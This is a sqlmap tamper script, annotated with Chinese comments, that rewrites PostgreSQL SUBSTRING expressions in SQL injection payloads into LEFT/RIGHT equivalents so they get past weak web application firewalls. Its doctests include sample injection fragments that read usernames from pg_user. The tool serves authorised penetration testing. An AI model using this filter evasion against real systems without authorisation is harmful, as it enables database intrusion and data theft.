#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT

    Tested against:
        * PostgreSQL 9.6.12

    Note:
        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)

    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')
    'LEFT((SELECT usename FROM pg_user)::text,1)'
    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')
    'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'
    """
    ##将string （from for）用法修改为left（）
    retVal = payload

    if payload:
        match = re.search(r"SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)", payload)
        ##单纯的匹配出使用string （from for）的字符串
        if match:
            pos = int(match.group(2))
            if pos == 1:
                ##如果from后的字符串为1
                _ = "LEFT(%s,1)" % (match.group(1))
                
            else:
                ##如果from后的字符串不为1
                _ = "LEFT(RIGHT(%s,%d),1)" % (match.group(1), 1 - pos)

            retVal = retVal.replace(match.group(0), _)

    return retVal
